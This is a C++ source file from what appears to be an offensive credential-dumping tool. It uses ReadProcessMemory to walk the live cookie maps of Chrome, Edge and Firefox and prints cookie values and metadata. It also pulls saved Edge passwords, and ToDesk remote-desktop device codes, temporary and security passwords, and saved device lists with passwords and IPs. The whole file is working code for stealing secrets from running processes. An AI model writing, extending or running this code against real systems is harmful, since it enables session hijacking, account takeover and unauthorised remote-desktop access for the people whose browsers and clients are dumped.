#include <Windows.h>
#include <Psapi.h>
#include <string>
#include <map>
#include <vector>
#include "Helper.h"
#include "Application.h"

struct CanonicalCookieChrome {
	uintptr_t _vfptr;
	OptimizedString name;
	OptimizedString domain;
	OptimizedString path;
	int64_t creation_date;
	bool secure;
	bool httponly;
	CookieSameSite same_site;
	char partition_key[128];
	CookieSourceScheme source_scheme;
	int source_port;
	ProcessBoundString value;
	int64_t expiry_date;
	int64_t last_access_date;
	int64_t last_update_date;
	CookiePriority priority;
	CookieSourceType source_type;
};
struct CanonicalCookieEdge {
	uintptr_t _vfptr;
	OptimizedString name;
	OptimizedString domain;
	OptimizedString path;
	int64_t creation_date;
	bool secure;
	bool httponly;
	CookieSameSite same_site;
	char partition_key[136];
	CookieSourceScheme source_scheme;
	int source_port;
	ProcessBoundString value;
	int64_t expiry_date;
	int64_t last_access_date;
	int64_t last_update_date;
	CookiePriority priority;
	CookieSourceType source_type;
};

struct CanonicalCookieFireFox {
	uintptr_t _vfptr;
	char buf[8];
	NsCString name;
	NsCString value;
	NsCString domain;
	NsCString path;
	char padding[8];
	int64_t expiry_date;
	int64_t last_access_date;
	int64_t creation_date;
};

struct CanonicalTodesk {
	TodeskString temp_password;
	TodeskString password;
	TodeskString appdata_dir;
	TodeskString config_file;
	TodeskString root_dir;
	TodeskString record_dir;
	TodeskString screenre_solution;
	TodeskString update_time;
	TodeskString code;
};
struct CanonicalTodeskList {
	TodeskString name;
	TodeskString code;
	TodeskString padding;
	TodeskString ip;
};
struct CanonicalTodeskListWithPass {
	TodeskString name;
	TodeskString code;
	TodeskString pass;
};

#pragma comment(lib, "version.lib")
BOOL GetBrowserVersion(HANDLE hProcess, BrowserVersion& browserVersion) {

	LPWSTR filePath = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
	if (filePath == NULL || GetModuleFileNameEx(hProcess, NULL, filePath, MAX_PATH) == 0) {
		PRINT("GetModuleFileNameEx failed");
		free(filePath);
		return FALSE;
	}
	DWORD dwHandle;
	DWORD dwSize = GetFileVersionInfoSize(filePath, &dwHandle);
	if (dwSize == 0)
	{
		PRINT("GetFileVersionInfoSize failed");
		free(filePath);
		return FALSE;
	}

	BYTE* buffer = (BYTE*)malloc(dwSize);
	if (buffer == nullptr || !GetFileVersionInfo(filePath, 0, dwSize, buffer))
	{
		PRINT("GetFileVersionInfo failed");
		free(buffer);
		free(filePath);
		return FALSE;
	}

	free(filePath);

	VS_FIXEDFILEINFO* fileinfo;
	UINT len = 0;
	if (!VerQueryValue(buffer, TEXT("\\"), reinterpret_cast<void**>(&fileinfo), &len))
	{
		PRINT("VerQueryValue failed");
		free(buffer);
		return FALSE;
	}

	if (len == 0)
	{
		PRINT("VerQueryValue returned empty VS_FIXEDFILEINFO");
		free(buffer);
		return FALSE;
	}

	PRINT("[*] Application Version: %hu.%hu.%hu.%hu\n\n",
		HIWORD(fileinfo->dwProductVersionMS),
		LOWORD(fileinfo->dwProductVersionMS),
		HIWORD(fileinfo->dwProductVersionLS),
		LOWORD(fileinfo->dwProductVersionLS)
	);
	browserVersion.highMajor = HIWORD(fileinfo->dwProductVersionMS);
	browserVersion.lowMajor = LOWORD(fileinfo->dwProductVersionMS);
	browserVersion.highMinor = HIWORD(fileinfo->dwProductVersionLS);
	browserVersion.lowMinor = LOWORD(fileinfo->dwProductVersionLS);

	free(buffer);
	return TRUE;
}
void ReadStringChrome(HANDLE hProcess, OptimizedString string) {
	if (string.len > 23)
	{
		RemoteString longString = { 0 };
		std::memcpy(&longString, &string.buf, sizeof(RemoteString));

		if (longString.dataAddress != 0) {
			PRINT("Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
			unsigned char* buf = (unsigned char*)malloc(longString.strMax);
			if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
				PRINT("Failed to read cookie value");
				free(buf);
				return;
			}
			PRINT("%s\n", buf);
			free(buf);
		}
	}
	else
		PRINT("%s\n", string.buf);
}

void ReadStringFireFox(HANDLE hProcess, NsCString string) {
	if (string.address != 0) {
		unsigned char* buf = (unsigned char*)malloc(string.len + 1);
		if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(string.address), buf, string.len + 1, nullptr)) {
			PRINT("Failed to read cookie value");
			free(buf);
			return;
		}
		PRINT("%s\n", buf);
	}
}
void ReadPassEdge(HANDLE hProcess, int64_t address, char len) {
	unsigned char* buf = (unsigned char*)malloc(len + 1);
	if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(address), buf, len + 1, nullptr)) {
		PRINT("Failed to read cookie value");
		free(buf);
		return;
	}
	buf[len] = '\0';

	const char* http = NULL;
	char* domain = NULL;
	char* username = NULL;
	char* password = NULL;
	char* context = NULL;

	char* token = strtok_s((char*)buf, " ", &context);
	if (token) domain = token;
	if (token) {
		domain = token;
		size_t len = strlen(domain);
		if (len > 0) {
			if (domain[len - 1] == 's') {
				http = "https";
				domain[len - 5] = '\0';
			}
			else {
				http = "http";
				domain[len - 4] = '\0';
			}
		}
	}
	token = strtok_s(NULL, " ", &context);
	if (token) username = token;
	token = strtok_s(NULL, " ", &context);
	if (token) password = token;
	PRINT("    Domain:   %s://%s\n", http, domain);
	PRINT("    Username: %s\n", username);
	PRINT("    Password: %s\n", password);
}
void ReadStringTodesk(HANDLE hProcess, TodeskString string, int64_t address) {
	unsigned char* buf = (unsigned char*)malloc(string.len + 1);
	if (string.len < 0x10) {
		if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(address), buf, string.len + 1, nullptr)) {
			PRINT("Failed to read todesk value");
			free(buf);
			return;
		}
	}
	else {
		if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(string.string_part_1), buf, string.len + 1, nullptr)) {
			PRINT("Failed to read todesk value");
			free(buf);
			return;
		}
	}
	PRINT("%s\n", buf);
}
void ReadStringTodeskPath(HANDLE hProcess, TodeskString string) {
	unsigned char* buf = (unsigned char*)malloc(string.len + 1);
	if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(string.string_part_1), buf, string.len + 1, nullptr)) {
		PRINT("Failed to read todesk value");
		free(buf);
		return;
	}
	PRINT("%s\n", buf);
}

void ReadVector(HANDLE hProcess, RemoteVector vector, DWORD origSize) {
	size_t szSize = vector.end_ - vector.begin_;
	if (szSize <= 0) {
		printf("[-] Invalid value length\n");
		return;
	}

	BYTE* buf = (BYTE*)malloc(szSize + 1);
	if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(vector.begin_), buf, szSize, nullptr)) {
		PRINT("Failed to read encrypted cookie value");
		free(buf);
		return;
	}

	memcpy_s(buf + szSize, 1, "\0", 1);
	PRINT("%s\n", buf);

	free(buf);
}

void PrintTimeStamp(int64_t timeStamp) {
	ULONGLONG fileTimeTicks = timeStamp * 10;

	FILETIME fileTime;
	fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
	fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

	SYSTEMTIME systemTime;
	FileTimeToSystemTime(&fileTime, &systemTime);

	PRINT("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
		systemTime.wYear, systemTime.wMonth, systemTime.wDay,
		systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
}

int64_t AdjustToMilliseconds(int64_t ts) {
	if (ts >= 1000000000000000LL) {
		return ts / 1000;
	}
	else if (ts >= 1000000000000LL) {
		return ts;
	}
	else if (ts >= 1000000000LL) {
		return ts * 1000;
	}
	else {
		return -1;
	}
}

void PrintUnixTimestamp(int64_t originalTs) {
	int64_t msTs = AdjustToMilliseconds(originalTs);
	if (msTs < 0) {
		printf("Invalid timestamp: %lld\n", originalTs);
		return;
	}
	const int64_t EPOCH_DIFF_MS = 11644473600000LL;
	ULONGLONG fileTimeTicks = (msTs + EPOCH_DIFF_MS) * 10000;

	FILETIME fileTimeUTC;
	fileTimeUTC.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
	fileTimeUTC.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

	FILETIME fileTimeLocal;
	SYSTEMTIME systemTime;

	FileTimeToLocalFileTime(&fileTimeUTC, &fileTimeLocal);
	FileTimeToSystemTime(&fileTimeLocal, &systemTime);

	printf("%04hu-%02hu-%02hu %02hu:%02hu:%02hu.%03hu\n",
		systemTime.wYear, systemTime.wMonth, systemTime.wDay,
		systemTime.wHour, systemTime.wMinute, systemTime.wSecond,
		systemTime.wMilliseconds);
}

void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess) {
	PRINT("    Name: ");
	ReadStringChrome(hProcess, cookie.name);
	PRINT("    Value: ");
	ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
	PRINT("    Domain: ");
	ReadStringChrome(hProcess, cookie.domain);
	PRINT("    Path: ");
	ReadStringChrome(hProcess, cookie.path);
	PRINT("    Creation time: ");
	PrintTimeStamp(cookie.creation_date);
	PRINT("    Expiration time: ");
	PrintTimeStamp(cookie.expiry_date);
	PRINT("    Last accessed: ");
	PrintTimeStamp(cookie.last_access_date);
	PRINT("    Last updated: ");
	PrintTimeStamp(cookie.last_update_date);
	PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
	PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

	PRINT("\n");
}

void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess) {
	PRINT("    Name: ");
	ReadStringChrome(hProcess, cookie.name);
	PRINT("    Value: ");
	ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
	PRINT("    Domain: ");
	ReadStringChrome(hProcess, cookie.domain);
	PRINT("    Path: ");
	ReadStringChrome(hProcess, cookie.path);
	PRINT("    Creation time: ");
	PrintTimeStamp(cookie.creation_date);
	PRINT("    Expiration time: ");
	PrintTimeStamp(cookie.expiry_date);
	PRINT("    Last accessed: ");
	PrintTimeStamp(cookie.last_access_date);
	PRINT("    Last updated: ");
	PrintTimeStamp(cookie.last_update_date);
	PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
	PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

	PRINT("\n");
}

void PrintValuesFireFox(CanonicalCookieFireFox cookie, HANDLE hProcess) {
	PRINT("    Name: ");
	ReadStringFireFox(hProcess, cookie.name);
	PRINT("    Value: ");
	ReadStringFireFox(hProcess, cookie.value);
	PRINT("    Domain: ");
	ReadStringFireFox(hProcess, cookie.domain);
	PRINT("    Path: ");
	ReadStringFireFox(hProcess, cookie.path);
	PRINT("    Expiration time: ");
	PrintUnixTimestamp(cookie.expiry_date);
	PRINT("    Creation time: ");
	PrintUnixTimestamp(cookie.creation_date);
	PRINT("    Last accessed: ");
	PrintUnixTimestamp(cookie.last_access_date);
	PRINT("\n");
}
void PrintValuesTodesk(CanonicalTodesk todesk, HANDLE hProcess, int64_t address) {
	PRINT("    设备代码: ");
	ReadStringTodesk(hProcess, todesk.code, address + 0x100);
	PRINT("    临时密码: ");
	ReadStringTodesk(hProcess, todesk.temp_password, address);
	PRINT("    安全密码: ");
	ReadStringTodesk(hProcess, todesk.password, address + 0x20);
	PRINT("    AppData目录: ");
	ReadStringTodeskPath(hProcess, todesk.appdata_dir);
	PRINT("    配置文件: ");
	ReadStringTodeskPath(hProcess, todesk.config_file);
	PRINT("    根目录: ");
	ReadStringTodeskPath(hProcess, todesk.root_dir);
	PRINT("    屏幕分辨率: ");
	ReadStringTodesk(hProcess, todesk.screenre_solution, address + 0xC0);
	PRINT("    临时密码更新时间: ");
	ReadStringTodesk(hProcess, todesk.update_time, address + 0xE0);
	PRINT("\n");
}
void PrintValuesTodeskList(CanonicalTodeskList todesk, HANDLE hProcess, int64_t address) {
	PRINT("    设备名称: ");
	ReadStringTodesk(hProcess, todesk.name, address);
	PRINT("    设备代码: ");
	ReadStringTodesk(hProcess, todesk.code, address + 0x20);
	PRINT("    IP地址: ");
	ReadStringTodesk(hProcess, todesk.ip, address + 0x60);
	PRINT("\n");
}
void PrintValuesTodeskListWithPass(CanonicalTodeskListWithPass todesk, HANDLE hProcess, int64_t address) {
	PRINT("    设备名称: ");
	ReadStringTodesk(hProcess, todesk.name, address);
	PRINT("    设备代码: ");
	ReadStringTodesk(hProcess, todesk.code, address + 0x20);
	PRINT("    密码: ");
	ReadStringTodesk(hProcess, todesk.pass, address + 0x40);
	PRINT("\n");
}

void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, AppLication targetBrowser, AppMode mode) {

	if (targetBrowser == Chrome)
	{
		CanonicalCookieChrome cookie = { 0 };
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
			PRINT("Failed to read cookie struct");
			return;
		}
		PrintValuesChrome(cookie, hProcess);

	}
	else if (targetBrowser == Edge)
	{
		if (mode == Pass) {

		}
		else {
			CanonicalCookieEdge cookie = { 0 };
			if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
				PRINT("Failed to read cookie struct");
				return;
			}
			PrintValuesEdge(cookie, hProcess);
		}
	}
	else if (targetBrowser == FireFox)
	{
		CanonicalCookieFireFox cookie = { 0 };
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieFireFox), nullptr)) {
			PRINT("Failed to read cookieData");
			return;
		}
		PrintValuesFireFox(cookie, hProcess);
	}
	else {
		PRINT("[-] Could not read cookie values: Unknown configuration %d", targetBrowser);
	}

}
void ProcessNode(HANDLE hProcess, const Node& node, AppLication targetBrowser, AppMode mode) {
	PRINT("Cookie Key: ");
	ReadStringChrome(hProcess, node.key);
	PRINT("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
	ProcessNodeValue(hProcess, node.valueAddress, targetBrowser, mode);

	if (node.left != 0) {
		Node leftNode;
		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
			ProcessNode(hProcess, leftNode, targetBrowser, mode);
		else
			PRINT("Error reading left node");
	}

	if (node.right != 0) {
		Node rightNode;
		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
			ProcessNode(hProcess, rightNode, targetBrowser, mode);
		else
			PRINT("Error reading right node");
	}
}
void ProcessPassNode(HANDLE hProcess, const PassNode& node, int64_t nodeAddress, AppLication targetBrowser, AppMode mode) {
	PRINT("\nAttempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
	int64_t reslut = node.valueAddress & 0xFFFF000000000000;
	if (node.tag > 0x16) {
		ReadPassEdge(hProcess, node.valueAddress, node.len);
	}
	else
	{
		ReadPassEdge(hProcess, nodeAddress + 0x20, node.tag);
	}


	if (node.left != 0) {
		PassNode leftNode;
		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(PassNode), nullptr))
			ProcessPassNode(hProcess, leftNode, node.left, targetBrowser, mode);
		else
			PRINT("Error reading left node");
	}

	if (node.right != 0) {
		PassNode rightNode;
		if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(PassNode), nullptr))
			ProcessPassNode(hProcess, rightNode, node.right, targetBrowser, mode);
		else
			PRINT("Error reading right node");
	}
}

void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targetBrowser, AppMode mode) {
	if (targetBrowser == FireFox) {
		uintptr_t cookieEntry;
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieEntry, sizeof(uintptr_t), nullptr)) {
			PRINT("Failed to read the cookieEntry\n");
			return;
		}
		CookieStruct cookieStruct;
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieEntry), &cookieStruct, sizeof(CookieStruct), nullptr)) {
			PRINT("Failed to read the cookieStruct\n");
			return;
		}
		uintptr_t cookieDataAddress = cookieStruct.cookieDataAddress;
		PRINT("[+] Address of cookieData: 0x%p\n", cookieDataAddress);
		ProcessNodeValue(hProcess, cookieDataAddress, targetBrowser, mode);
	}
	else {
		RootNode cookieMap;
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
			PRINT("Failed to read the root node from given address\n");
			return;
		}

		PRINT("Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
		PRINT("Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
		PRINT("Size of the cookie map: %Iu\n", cookieMap.size);

		PRINT("[*] Number of available cookies: %Iu\n", cookieMap.size);

		if (cookieMap.firstNode == 0 || cookieMap.size == 0)
		{
			PRINT("[*] This Cookie map was empty\n");
			return;
		}
		if (mode == Pass) {
			PassNode firstNode;
			if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(PassNode), nullptr) && &firstNode != nullptr) {
				ProcessPassNode(hProcess, firstNode, cookieMap.firstNode, targetBrowser, mode);
			}
			else
				PRINT("Error reading first node\n");
		}
		else {
			Node firstNode;
			if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
				ProcessNode(hProcess, firstNode, targetBrowser, mode);
			}
			else
				PRINT("Error reading first node\n");
		}

	}
}
void WalkRemoteApp(HANDLE hProcess, uintptr_t patternAddress, AppLication targetApplication, AppMode mode) {
	CanonicalTodesk todesk;
	CanonicalTodeskList todesklist;
	CanonicalTodeskListWithPass todesklistwithpass;
	switch (mode) {
	case Pass:
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(patternAddress), &todesklistwithpass, sizeof(CanonicalTodeskListWithPass), nullptr)) {
			PRINT("Failed to read the todeskData\n");
			return;
		}
		PrintValuesTodeskListWithPass(todesklistwithpass, hProcess, patternAddress);
		break;
	case List:
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(patternAddress), &todesklist, sizeof(CanonicalTodeskList), nullptr)) {
			PRINT("Failed to read the todeskData\n");
			return;
		}
		PrintValuesTodeskList(todesklist, hProcess, patternAddress);
		break;
	case Normal:
	default:
		if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(patternAddress), &todesk, sizeof(CanonicalTodesk), nullptr)) {
			PRINT("Failed to read the todeskData\n");
			return;
		}
		PrintValuesTodesk(todesk, hProcess, patternAddress);
		break;
	}
}